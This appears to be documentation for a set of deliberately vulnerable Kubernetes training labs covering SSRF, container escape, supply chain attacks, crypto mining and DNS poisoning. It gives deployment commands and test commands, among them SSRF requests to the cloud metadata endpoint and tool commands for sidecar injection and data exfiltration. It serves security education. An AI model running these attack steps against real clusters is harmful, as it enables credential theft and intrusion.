For lab manifests 17-21

SSRF (Server-Side Request Forgery) Vulnerability Lab
**File:** `17-ssrf-vulnerability.yaml`
**Namespace:** `ssrf-lab`

#### Vulnerabilities:
- Web application with SSRF vulnerability
- Internal API service exposure
- Metadata endpoint access
- Kubernetes API access through SSRF
- Sensitive data exposure

#### Learning Objectives:
- Understand SSRF attack vectors in Kubernetes
- Learn to exploit internal network access
- Practice cloud metadata extraction
- Test Kubernetes API access through SSRF

#### Commands to Test:
```bash
# Deploy the lab
kubectl apply -f 17-ssrf-vulnerability.yaml

# Test SSRF vulnerability
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://internal-api:8080"
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://169.254.169.254"
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://kubernetes.default.svc.cluster.local"
```

### 2. Container Escape Vulnerability Lab
**File:** `18-container-escape.yaml`
**Namespace:** `container-escape-lab`

#### Vulnerabilities:
- Privileged containers with host access
- Docker socket exposure
- Cgroup escape vulnerabilities
- Kernel module access
- Host filesystem access

#### Learning Objectives:
- Understand container escape techniques
- Learn privilege escalation methods
- Practice host system access
- Test container security boundaries

#### Commands to Test:
```bash
# Deploy the lab
kubectl apply -f 18-container-escape.yaml

# Test container escape
kubectl exec -it privileged-escape-pod -n container-escape-lab -- /bin/sh
kubectl exec -it docker-socket-pod -n container-escape-lab -- /bin/sh
kubectl exec -it cgroup-escape-pod -n container-escape-lab -- /bin/sh
```

### 3. Supply Chain Attack Lab
**File:** `19-supply-chain-attack.yaml`
**Namespace:** `supply-chain-lab`

#### Vulnerabilities:
- Malicious container registry
- Compromised application images
- Backdoored dependencies
- Registry poisoning
- Dependency confusion

#### Learning Objectives:
- Understand supply chain attack vectors
- Learn to identify malicious images
- Practice dependency analysis
- Test registry security

#### Commands to Test:
```bash
# Deploy the lab
kubectl apply -f 19-supply-chain-attack.yaml

# Test supply chain vulnerabilities
kubectl exec -it compromised-app-<pod-id> -n supply-chain-lab -- /bin/sh
kubectl exec -it compromised-dependencies -n supply-chain-lab -- /bin/sh
kubectl exec -it compromised-base-image -n supply-chain-lab -- /bin/sh
```

### 4. Crypto Miner Lab
**File:** `20-crypto-miner.yaml`
**Namespace:** `crypto-miner-lab`

#### Vulnerabilities:
- Crypto mining pods with excessive resources
- GPU mining capabilities
- Hidden mining processes
- Resource exhaustion attacks
- Mining pool connections

#### Learning Objectives:
- Understand crypto mining attacks
- Learn resource monitoring
- Practice anomaly detection
- Test resource limits

#### Commands to Test:
```bash
# Deploy the lab
kubectl apply -f 20-crypto-miner.yaml

# Monitor resource usage
kubectl top pods -n crypto-miner-lab
kubectl describe pods -n crypto-miner-lab
kubectl logs crypto-miner-pod -n crypto-miner-lab
```

### 5. DNS Poisoning Lab
**File:** `21-dns-poisoning.yaml`
**Namespace:** `dns-poisoning-lab`

#### Vulnerabilities:
- Malicious DNS server
- DNS cache poisoning
- DNS hijacking
- DNS spoofing
- Traffic redirection

#### Learning Objectives:
- Understand DNS attack vectors
- Learn DNS poisoning techniques
- Practice traffic interception
- Test DNS security

#### Commands to Test:
```bash
# Deploy the lab
kubectl apply -f 21-dns-poisoning.yaml

# Test DNS poisoning
kubectl exec -it dns-cache-poisoning -n dns-poisoning-lab -- /bin/sh
kubectl exec -it dns-hijacking -n dns-poisoning-lab -- /bin/sh
kubectl exec -it dns-spoofing -n dns-poisoning-lab -- /bin/sh
```

## 🚀 Quick Start

### Deploy All Scenarios
```bash
# Deploy all new lab scenarios
kubectl apply -f 17-ssrf-vulnerability.yaml
kubectl apply -f 18-container-escape.yaml
kubectl apply -f 19-supply-chain-attack.yaml
kubectl apply -f 20-crypto-miner.yaml
kubectl apply -f 21-dns-poisoning.yaml

# Verify deployment
kubectl get pods --all-namespaces | grep -E "(ssrf|container-escape|supply-chain|crypto-miner|dns-poisoning)"
```

### Clean Up All Scenarios
```bash
# Remove all lab scenarios
kubectl delete -f 17-ssrf-vulnerability.yaml
kubectl delete -f 18-container-escape.yaml
kubectl delete -f 19-supply-chain-attack.yaml
kubectl delete -f 20-crypto-miner.yaml
kubectl delete -f 21-dns-poisoning.yaml
```

## 🎓 Learning Path

### Beginner Level
1. **SSRF Lab** - Start with web application vulnerabilities
2. **Crypto Miner Lab** - Learn about resource monitoring
3. **DNS Poisoning Lab** - Understand network attacks

### Intermediate Level
1. **Container Escape Lab** - Practice container security
2. **Supply Chain Lab** - Learn about image security

### Advanced Level
1. **All Labs Combined** - Test comprehensive security
2. **Custom Scenarios** - Create your own vulnerabilities
3. **Red Team Exercises** - Simulate real attacks

## 🔍 Security Testing

### Using KubeShadow
```bash
# Start dashboard
./kubeshadow dashboard

# Run reconnaissance on specific labs
./kubeshadow recon --namespace ssrf-lab --dashboard
./kubeshadow recon --namespace container-escape-lab --dashboard
./kubeshadow recon --namespace supply-chain-lab --dashboard
./kubeshadow recon --namespace crypto-miner-lab --dashboard
./kubeshadow recon --namespace dns-poisoning-lab --dashboard

# Test specific attack vectors
./kubeshadow sidecar-inject --namespace container-escape-lab --dashboard
./kubeshadow data-exfil --presigned-url "YOUR_URL" --dashboard
```

### Manual Testing
```bash
# Test SSRF
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://internal-api:8080"

# Test container escape
kubectl exec -it privileged-escape-pod -n container-escape-lab -- /bin/sh

# Test supply chain
kubectl exec -it compromised-app-<pod-id> -n supply-chain-lab -- /bin/sh

# Test crypto mining
kubectl top pods -n crypto-miner-lab

# Test DNS poisoning
kubectl exec -it dns-cache-poisoning -n dns-poisoning-lab -- /bin/sh
```

## 🛡️ Security Considerations

### ⚠️ Important Notes
1. **Lab Environment Only** - Never deploy these configurations in production
2. **Network Isolation** - Ensure lab clusters are isolated from production networks
3. **Resource Monitoring** - Monitor resource usage to prevent cost overruns
4. **Access Control** - Limit access to lab environments and credentials
5. **Data Sensitivity** - Never use real sensitive data in lab environments
6. **Cleanup Responsibility** - Always clean up resources after use

### Best Practices
- Use separate AWS/GCP/Azure accounts for lab environments
- Set up billing alerts to monitor cloud costs
- Implement network isolation between lab and production
- Regular cleanup of unused resources
- Document findings for learning purposes


## 🎯 Use Cases

### Educational Institutions
- Security courses with hands-on lab environments
- Research projects requiring isolated testing environments
- Student exercises with guided scenarios
- Instructor demonstrations with real-time monitoring

### Corporate Training
- Security awareness training for development teams
- Red team exercises with controlled environments
- Compliance testing with realistic scenarios
- Incident response practice with vulnerable configurations

### Security Professionals
- Penetration testing practice with Kubernetes
- Vulnerability research in controlled environments
- Tool development and testing
- Certification preparation for security exams

## 🤝 Contributing

We welcome contributions to improve the lab scenarios:

1. **Report issues** with lab deployments
2. **Suggest new scenarios** for educational value
3. **Improve documentation** and examples
4. **Add new attack vectors** or vulnerabilities
5. **Enhance security configurations** for realistic testing

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](../../LICENSE) file for details.

## 🙏 Acknowledgments

- **Kubernetes Goat** for the excellent educational methodology
- **Kubernetes community** for the excellent platform
- **Security researchers** who identified the vulnerabilities we simulate
- **Educational institutions** that provided feedback on lab scenarios
- **Open source contributors** who made this project possible

---

**Happy Learning! 🚀**

The KubeShadow Lab scenarios provide endless possibilities for Kubernetes security learning. Experiment, explore, and always practice responsibly!

For questions, issues, or contributions, please visit our [GitHub repository](https://github.com/kubeshadow/kubeshadow).
